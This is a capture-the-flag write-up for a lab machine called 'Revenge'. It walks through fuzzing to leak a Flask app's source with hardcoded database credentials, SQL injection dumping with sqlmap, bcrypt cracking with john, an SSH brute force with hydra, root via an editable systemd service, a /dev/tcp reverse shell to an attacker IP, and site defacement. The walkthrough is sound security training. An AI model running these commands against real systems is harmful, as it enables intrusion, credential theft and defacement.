---
layout: default
title: Example
---

## TL;DR

In this challenge we fuzzing, and find `requirements.txt`, from there we can guess it's using `flask`, so we fuzz for .py files, and find `app.py`.

Then, we detect `SQLi` in the source code, and exploit it to get flag1, and also hash for user `server-admin` which we crack. The flag will be there on the home dir.

We can privilege esaclete to `root` using sudo permissions on `/etc/systemd/system/duckyinc.service`. 

Lastly, we deface `/var/www/duckyinc/templates/index.html` to get flag3.

### Recon

we start with `rustscan`, using this command:
```bash
rustscan -a $target -- -sV -sC
```

![rustscan results](image.png)

We can see port `22` with ss and port `80` with nginx http server.

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBiHOfDlVoYCp0+/LM7BhujeUicHQ+HwAidwcp1yMZE3j6K/7RW3XsNSEyUR8RpVaXAHl7ThNfD2pmzGPBV9uOjNlgNuzhASOgQuz9G4h
QyLh5u1Sv9QR8R9udClyRoqUwGBfdNKjqAK2Kw7OghAHXlwUxniYRLUeAD60oLjm4uIv+1QlA2t5/LL6utV2ePWOEHe8WehXPGrstJtJ8Jf/uM48s0jhLhMEewzSqR2w0LWAGDFzOdfnOvcyQ
tJ9FeswJRG7fWXXsOms0Fp4lhTL4fknL+PSdWEPagTjRfUIRxskkFsaxI//3EulETC+gSa+KilVRfiKAGTdrdz7RL5sl
|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNoSioP7IDDu4yIVfGnhLoMTyvBuzxILnRr7rKGX0YpNShJfHLjEQRIdUoYq+/7P0wBjLo
Xn9g7XpLLb7UMvm4=
|   256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEpROzuQcffRwKXCOz+JQ5p7QKnAQVEDUwwUkkblavyh
80/tcp open  http    syn-ack ttl 62 nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: E859DC70A208F0F0242640410296E06A
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Home | Rubber Ducky Inc.
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's add `revenge` to our `/etc/hosts`.

### Find app.py using fuzzing

We start with `ffuf`, searching for file extension of `xml`, `txt`, `js`, `php`, using the `-e` flag:
```bash
┌──(agonen㉿kali)-[~/thm/Revenge]
└─$ ffuf -u 'http://revenge/FUZZ' -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -e .php,.xml,.txt,.js

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://revenge/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
 :: Extensions       : .php .xml .txt .js 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index                   [Status: 200, Size: 8541, Words: 2138, Lines: 234, Duration: 252ms]
contact                 [Status: 200, Size: 6906, Words: 2319, Lines: 163, Duration: 236ms]
products                [Status: 200, Size: 7254, Words: 2103, Lines: 177, Duration: 414ms]
login                   [Status: 200, Size: 4980, Words: 1497, Lines: 132, Duration: 231ms]
admin                   [Status: 200, Size: 4983, Words: 1498, Lines: 132, Duration: 194ms]
static                  [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 159ms]
requirements.txt        [Status: 200, Size: 258, Words: 1, Lines: 16, Duration: 216ms]
``` 

We find the file `requirements.txt` which is very interesting

![ffuf find requirements.txt](image-2.png)

when fetching the file, we can detect this uses python packages, and especially `Flask`. In addition, there is `Jinja2` that might be helpful later with `SSTI`, who knows.
```bash
┌──(agonen㉿kali)-[~/thm/Revenge]
└─$ curl http://revenge/requirements.txt   
attrs==19.3.0
bcrypt==3.1.7
cffi==1.14.1
click==7.1.2
Flask==1.1.2
Flask-Bcrypt==0.7.1
Flask-SQLAlchemy==2.4.4
itsdangerous==1.1.0
Jinja2==2.11.2
MarkupSafe==1.1.1
pycparser==2.20
PyMySQL==0.10.0
six==1.15.0
SQLAlchemy==1.3.18
Werkzeug==1.0.1
```

We can use `ffuf`, this time with the extension `.py`, to find the source code of the flask application
```bash
┌──(agonen㉿kali)-[~/thm/Revenge]
└─$ ffuf -u "http://revenge/FUZZ" -w /usr/share/SecLists/Discovery/Web-Content/common.txt -e .py

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://revenge/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/common.txt
 :: Extensions       : .py 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 200, Size: 4983, Words: 1498, Lines: 132, Duration: 1010ms]
app.py                  [Status: 200, Size: 2371, Words: 267, Lines: 82, Duration: 111ms]
```

The file `app.py` is special, this is the default file in flask application, so it isn't such a big surprise to find it. 

![ffuf 2](image-1.png)

Now, let's analyze `app.py`:
```py
from flask import Flask, render_template, request, flash
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine
from flask_bcrypt import Bcrypt

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)


app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
eng = create_engine('mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc')


# Main Index Route
@app.route('/', methods=['GET'])
@app.route('/index', methods=['GET'])
def index():
    return render_template('index.html', title='Home')


# Contact Route
@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        flash('Thank you for reaching out.  Someone will be in touch shortly.')
        return render_template('contact.html', title='Contact')

    elif request.method == 'GET':
        return render_template('contact.html', title='Contact')


# Products Route
@app.route('/products', methods=['GET'])
def products():
    return render_template('products.html', title='Our Products')


# Product Route
# SQL Query performed here
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)


# Login
@app.route('/login', methods=['GET'])
def login():
    if request.method == 'GET':
        return render_template('login.html', title='Customer Login')


# Admin login
@app.route('/admin', methods=['GET'])
def admin():
    if request.method == 'GET':
        return render_template('admin.html', title='Admin Login')


# Page Not found error handler
@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html', error=e), 404


@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html', error=e), 500


if __name__ == "__main__":
    app.run('0.0.0.0')
```

Okay, first we have the credentials here:
```py
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)


app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
eng = create_engine('mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc')
```

### Use SQL Injection to get tables with hashes and flag 1

Second, there is `SQL Injection` here, in `/products/` route.

```bash
# Product Route
# SQL Query performed here
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)
```

Let's use `sqlmap` to dump databases:
```bash
sqlmap -u 'http://revenge/products/1' --batch --dbs
```

![sqlmap dbs](image-3.png)

These are the databases we get:
```bash
available databases [5]:                            
[*] duckyinc                                                                                                                                                                                 
[*] information_schema                              
[*] mysql                                      
[*] performance_schema                                                                                                                                                                                            
[*] sys
```

Let's dump the database `duckyinc`:
```bash
sqlmap -u 'http://revenge/products/1' --batch -D duckyinc --dump
```

We get three tables, table `system_user` with credentials, table `user` with credentials too, and table `product`

```bash
Database: duckyinc                                                                                                                                                                                                                          
Table: system_user                                                                                                                                                                                                                          
[3 entries]                                                                                                                                                                                                                                 
+----+----------------------+--------------+--------------------------------------------------------------+                                                                                                                                 
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+


Database: duckyinc
Table: user
[10 entries]
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+


Database: duckyinc
Table: product
[4 entries]
+----+----------+----------+-----------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| id | cost     | price    | name                  | details                                                                                                                                                                                                                                                                                                                 | in_stock | image_url                         | color_options             |
+----+----------+----------+-----------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| 1  | 50.00    | 35.00    | Box of Duckies        | Individual boxes of duckies! Boxes are sold only in the yellow color. This item is eligible for FAST shipping from one of our local warehouses. If you order before 2 PM on any weekday, we can guarantee that your order will be shipped out the same day.                                                             | Y        | images/box-of-duckies.png         | yellow                    |
| 2  | 500.00   | 600.00   | Dozen of Duckies      | Do you love a dozen donuts? Then you'll love a dozen boxes of duckies! This item is not eligible for FAST shipping. However, orders of this product are typically shipped out next day, provided they are ordered prior to 2 PM on any weekday.                                                                         | N        | images/dozen-boxes-of-duckies.png | yellow, blue, green, red  |
| 3  | 800.00   | 1000.00  | Pallet of Duckies     | Got lots of shelves to fill? Customers that want their duckies? Look no further than the pallet of duckies! This baby comes with 20 boxes of duckies in the colors of your choosing. Boxes can only contain one color ducky but multiple colors can be selected when you call to order. Just let your salesperson know. | N        | images/pallet.png                 | yellow, blue, red, orange |
| 4  | 15000.00 | 22000.00 | Truck Load of Duckies | This is it! Our largest order of duckies! You mean business with this order. You must have a ducky emporium if you need this many duckies. Due to the logistics with this type of order, FAST shipping is not available.\r\n\r\nActual truck not pictured.                                                              | Y        | images/truckload.png              | yellow, blue              |
+----+----------+----------+-----------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
```

We also get the flag:
```bash
thm{br3ak1ng_4nd_3nt3r1ng}
```

### Crack password of server-admin from system_user table

We can try to crack the hashes from `system_user`:
```bash
$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a
$2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa
$2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK
```

we'll use `john`:
```bash
┌──(agonen㉿kali)-[~/thm/Revenge]
└─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 256 to 4096
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
inuyasha         (?)
```

![john](image-4.png)

Okay, the users we have are:
```bash
server-admin
kmotley
dhughes
```

We can brute force the ssh login with these usernames and the password `inuyasha`, using `hydra`. 
```bash
┌──(agonen㉿kali)-[~/thm/Revenge]
└─$ hydra -L users.txt -p inuyasha ssh://revenge                                                                                                            
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-25 20:15:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:3/p:1), ~1 try per task
[DATA] attacking ssh://revenge:22/
[22][ssh] host: revenge   login: server-admin   password: inuyasha
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-25 20:16:00
```
And we managed to connect via `ssh` using these credentials:
```bash
server-admin:inuyasha
```

![ssh success](image-5.png)

The second flag:
```bash
server-admin@duckyinc:~$ cat flag2.txt 
thm{4lm0st_th3re}
```

### Privilege Escalation to Root using sudo permissions on /etc/systemd/system/duckyinc.service

We start with `sudo -l`:
```bash
server-admin@duckyinc:~$ sudo -l
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl
        daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
```

![sudo -l](image-6.png)

Okay, we can edit the service at `/etc/systemd/system/duckyinc.service`, and also restart the serivce as sudo.

First, let's change the `ExecStart`, and add this command there:
```bash
chmod u+s /bin/bash
```

Before chaneging:

![duckyinc.service](image-7.png)

new `/etc/systemd/system/duckyinc.service` will be, notice we change also the user and group to be `root`, and new command will be at `ExecStart`:
```bash
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash /tmp/rev_shell.sh
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```


We can execute this command to edit the file:
```bash
sudoedit /etc/systemd/system/duckyinc.service
```
After changing:

![changing](image-10.png)

Now, we can insert the payload from [https://www.revshells.com/](https://www.revshells.com/) to `/tmp/rev_shell.sh`, and reload plus restart the service:
```bash
server-admin@duckyinc:~$ echo -e 'sh -i >& /dev/tcp/192.168.132.168/1337 0>&1' > /tmp/rev_shell.sh 
server-admin@duckyinc:~$ sudo systemctl daemon-reload
server-admin@duckyinc:~$ sudo systemctl restart duckyinc.service
```

On our local machine, we just exeucte:
```bash
nc -nlvp 1337
```

![reverse shell as root](image-8.png)

Now, I pasted the payload from `penleope`

![paste penelope payload](image-9.png)

### Defacing /var/www/duckyinc/templates/index.html to get flag 3

I can't find the third flag inside `/root`:

![not third flag](image-11.png)

This is probably becuase we need to deface the website...

Inside `.viminfo`, we can detect the file `/var/www/duckyinc/templates/index.html` which was edited, probably this is what we need to deface.

![find /var/www/duckyinc/templates/index.html](image-12.png)

After defacing, we acctaully get the third flag:
```bash
root@duckyinc:~# echo -e 'BLABLABLAB' >> /var/www/duckyinc/templates/index.html
root@duckyinc:~# ls
flag3.txt
root@duckyinc:~# cat flag3.txt 
thm{m1ss10n_acc0mpl1sh3d}
```

![defacing](image-13.png)